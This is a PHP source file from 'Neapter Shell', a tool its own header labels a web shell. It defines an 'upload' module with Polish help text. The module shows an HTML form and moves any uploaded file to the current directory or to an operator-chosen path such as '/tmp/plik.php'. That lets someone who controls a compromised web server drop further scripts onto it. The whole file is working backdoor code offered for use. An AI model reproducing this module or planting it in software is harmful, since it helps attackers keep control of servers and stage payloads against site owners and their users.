<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Upload file via HTML form
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */
class ModuleUpload extends ModuleAbstract
{
    /**
     * Get list of available commands
     *
     * @return array
     */
    public static function getCommands()
    {
        return array('upload');
    }

    /**
     * Get module version
     *
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.1 2016-06-09 - <krzotr@gmail.com>';
    }

    /**
     * Get details module information
     *
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
upload - Wrzucanie pliku na serwer. Jeśli nie podano ścieżki, to plik zostanie wrzucony do obecnego katalogu

    Użycie:
        upload
        upload /tmp/plik.php
DATA;
    }

    /**
     * Execute module
     *
     * @return stringUpload file via HTML form
     */
    public function get()
    {
        if (($aFileData = Request::getFiles('file')) !== false) {
            $sUploadLocation = getcwd() . '/';

            if ($this->oArgs->getNumberOfParams() === 0) {
                $sUploadLocation .= basename($aFileData['name']);
            } else {
                $sUploadLocation = $this->oArgs->getParam(0);
            }

            return sprintf(
                "Plik %swgrany",
                (! @rename($aFileData['tmp_name'], $sUploadLocation) ? 'nie ' : '')
            );
        }

        return sprintf(
            '<form action="%s" method="post" enctype="multipart/form-data">' .
            '<pre id="console"><h1>Wrzuć plik</h1><input type="file" name="file"/></pre>' .
            '<input type="text" name="cmd" value="%s" size="110" id="cmd"/>' .
            '<input type="submit" name="submit" value="Wrzuć" id="cmd-send"/></form>',
            Request::getCurrentUrl(),
            htmlspecialchars(Request::getPost('cmd'))
        );
    }
}
